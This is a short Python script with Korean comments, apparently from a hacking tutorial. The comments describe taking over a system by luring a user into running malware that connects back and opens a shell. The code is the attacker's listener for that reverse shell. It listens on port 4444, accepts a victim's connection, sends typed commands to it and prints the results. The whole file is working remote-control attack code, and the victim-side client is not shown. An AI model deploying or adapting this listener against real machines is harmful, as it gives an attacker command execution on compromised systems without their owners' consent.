# server
import socket
'''
목표 시스템을 장악하는 방법은 크게 두가지
첫 번째, 프로그램의 오작동을 일으켜 의도하지 않은 코드가 실행되게 하는 취약점을 이용하는법
두 번째, 악성 코드를 실행하도록 사용자가 유도하는 방법: 공격자의 서버 측으로 접속을 시도하며 명령 셀을 열어준다면 시스템을 마음대로 제어가능
'''

# 소켓을 열고 기다리는 공격자 코드
def set_sock(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((ip, port))
    s.listen(1)
    conn, addr = s.accept()
    return conn, addr


def command(conn, addr):
    print("[+] Connected to", addr)
    while True:
        command = input(">")
        if command == "exit":
            conn.send(b"exit")
            conn.close()
            break
        elif command == "":
            print("Input command...")
        else:
            conn.send(command.encode())
            output = conn.recv(65535)
            print(output.decode("euc-kr", "ignore"), end="")


if __name__ == "__main__":
    ip = "0.0.0.0"  # 0.0.0.0 주소는 모든 로컬 주소와 바인딩가능
    port = 4444
    conn, addr = set_sock(ip, port)
    command(conn, addr)
